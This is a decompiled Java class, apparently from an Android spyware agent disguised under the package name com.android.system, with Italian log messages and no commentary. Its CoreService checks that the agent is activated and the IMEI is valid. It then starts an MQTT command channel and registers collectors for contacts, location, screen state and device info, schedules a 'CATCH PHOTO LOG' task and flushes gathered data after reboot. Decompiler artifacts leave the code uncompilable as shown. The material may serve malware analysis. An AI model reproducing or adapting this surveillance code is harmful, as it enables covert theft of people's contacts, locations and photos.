package com.android.system;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.os.IBinder;
import com.app.system.common.c.g;
import com.app.system.common.d.a.p;
import com.app.system.mqtt.MqttKeepAlive;
import com.crashlytics.android.Crashlytics;
import java.util.Timer;
import java.util.TimerTask;

public class CoreService
  extends Service
{
  com.app.system.common.c.a a;
  com.app.system.common.c.b b;
  com.app.system.common.c.c c;
  com.app.system.common.c.e d;
  com.app.system.common.c.f e;
  g f;
  Timer g;
  
  public void a()
  {
    Object localObject = getSharedPreferences("pref", 0);
    if (((SharedPreferences)localObject).getInt("is_first_reboot", 0) == 1)
    {
      com.security.d.a.c("CoreService", "FLUSH DATA AFTER FIRST REBOOT", new Object[0]);
      if (com.app.system.common.h.b(this))
      {
        localObject = ((SharedPreferences)localObject).edit();
        ((SharedPreferences.Editor)localObject).putInt("is_first_reboot", 2);
        ((SharedPreferences.Editor)localObject).commit();
        new Thread(new a()).start();
      }
      else
      {
        com.security.d.a.a("CoreService", "IMEI NON VALIDO -- FLUSH NON ESEGUITO", new Object[0]);
      }
    }
  }
  
  public void b()
  {
    try
    {
      com.security.d.a.d("CoreService", "initService", new Object[0]);
      Context localContext = getApplicationContext();
      Object localObject1 = getSharedPreferences("pref", 0);
      if (!((SharedPreferences)localObject1).getBoolean("agent-active", false))
      {
        com.security.d.a.a("CoreService", "L'AGENT NON E' STATO ATTIVATO!!! -- USCITA!", new Object[0]);
        com.security.d.a.a("CoreService", "---- QUESTO CASO NON SI DOVREBBE MAI VERIFICARE! ----", new Object[0]);
        return;
      }
      com.security.d.a.d("CoreService", "Registro receiver per connessione", new Object[0]);
      IntentFilter localIntentFilter = new android/content/IntentFilter;
      localIntentFilter.<init>();
      localIntentFilter.addAction("android.net.conn.CONNECTIVITY_CHANGE");
      Object localObject2 = new com/android/system/e;
      ((e)localObject2).<init>();
      localContext.registerReceiver((BroadcastReceiver)localObject2, localIntentFilter);
      localObject2 = new java/lang/StringBuilder;
      ((StringBuilder)localObject2).<init>();
      ((StringBuilder)localObject2).append("initService - LAST SYNC TIME >>===> ");
      ((StringBuilder)localObject2).append(((SharedPreferences)localObject1).getLong("last_sync_time", 0L));
      com.security.d.a.d("CoreService", ((StringBuilder)localObject2).toString(), new Object[0]);
      com.app.system.mqtt.a.a().a(localContext);
      MqttKeepAlive.a(localContext);
      c.a().a(localContext);
      b.a().a(localContext);
      ContactsReceiver.a(localContext);
      SyncDeviceInfoReceiver.a(localContext, true);
      com.app.system.common.f.a().a(localContext);
      ScreenReceiver.a(localContext);
      d.a().a(localContext);
      if (((SharedPreferences)localObject1).getLong("last_sync_time", 0L) == 0L)
      {
        com.app.system.common.e.a(localContext);
        if (com.app.system.common.f.a.b(localContext) == 1) {
          SyncAndFlushReceiver.c(localContext);
        }
        if (com.app.system.common.f.a.a(localContext) == 1) {
          LocationReceiver.c(localContext);
        }
        localObject2 = new java/lang/Thread;
        localObject1 = new com/android/system/CoreService$1;
        ((1)localObject1).<init>(this, localContext);
        ((Thread)localObject2).<init>((Runnable)localObject1);
        ((Thread)localObject2).start();
      }
      localObject1 = new com/app/system/common/c/f;
      ((com.app.system.common.c.f)localObject1).<init>();
      this.e = ((com.app.system.common.c.f)localObject1);
      this.e.a(localContext);
      localObject1 = new com/app/system/common/c/c;
      ((com.app.system.common.c.c)localObject1).<init>();
      this.c = ((com.app.system.common.c.c)localObject1);
      this.c.a(localContext);
      localObject1 = new com/app/system/common/c/a;
      ((com.app.system.common.c.a)localObject1).<init>();
      this.a = ((com.app.system.common.c.a)localObject1);
      this.a.a(localContext);
      localObject1 = new com/app/system/common/c/g;
      ((g)localObject1).<init>();
      this.f = ((g)localObject1);
      this.f.a(localContext);
      localObject1 = new com/app/system/common/c/b;
      ((com.app.system.common.c.b)localObject1).<init>();
      this.b = ((com.app.system.common.c.b)localObject1);
      this.b.a(localContext);
      c();
    }
    catch (Exception localException)
    {
      com.security.d.a.d("CoreService", localException.getMessage(), new Object[0]);
    }
  }
  
  public void c()
  {
    this.g = new Timer();
    this.g.scheduleAtFixedRate(new b(), 60000L, 300000L);
  }
  
  public IBinder onBind(Intent paramIntent)
  {
    return null;
  }
  
  public void onCreate()
  {
    super.onCreate();
    io.fabric.sdk.android.c.a(this, new io.fabric.sdk.android.h[] { new Crashlytics() });
    com.security.d.a.d("CoreService", "onCreate Service", new Object[0]);
    try
    {
      b();
    }
    catch (Exception localException)
    {
      com.security.d.a.a("CoreService", localException.getMessage(), new Object[0]);
    }
  }
  
  public void onDestroy()
  {
    try
    {
      Context localContext = getApplicationContext();
      if (this.e != null) {
        this.e.c(localContext);
      }
      if (this.c != null) {
        this.c.c(localContext);
      }
      if (this.d != null) {
        this.d.c(localContext);
      }
      if (this.a != null) {
        this.a.b(localContext);
      }
      if (this.f != null) {
        this.f.c(localContext);
      }
      if (this.b != null) {
        this.b.c(localContext);
      }
    }
    catch (Exception localException)
    {
      com.security.d.a.d("CoreService", localException.getMessage(), new Object[0]);
    }
  }
  
  public void onLowMemory() {}
  
  public int onStartCommand(Intent paramIntent, int paramInt1, int paramInt2)
  {
    return 1;
  }
  
  class a
    implements Runnable
  {
    a() {}
    
    public void run()
    {
      try
      {
        com.app.system.common.f.a.i(CoreService.this.getApplicationContext());
      }
      catch (Exception localException)
      {
        StringBuilder localStringBuilder = new StringBuilder();
        localStringBuilder.append("Flush Data After Reboot - ");
        localStringBuilder.append(localException.getMessage());
        com.security.d.a.a("CoreService", localStringBuilder.toString(), new Object[0]);
      }
    }
  }
  
  class b
    extends TimerTask
  {
    b() {}
    
    public void run()
    {
      com.security.d.a.d("CoreService", "CATCH PHOTO LOG", new Object[0]);
      CoreService.this.d = new com.app.system.common.c.e();
      CoreService.this.d.a(CoreService.this.getApplicationContext());
      CoreService.this.a();
      CoreService.this.g.cancel();
    }
  }
}


/* Location:              ~/com/android/system/CoreService.class
 *
 * Reversed by:           J
 */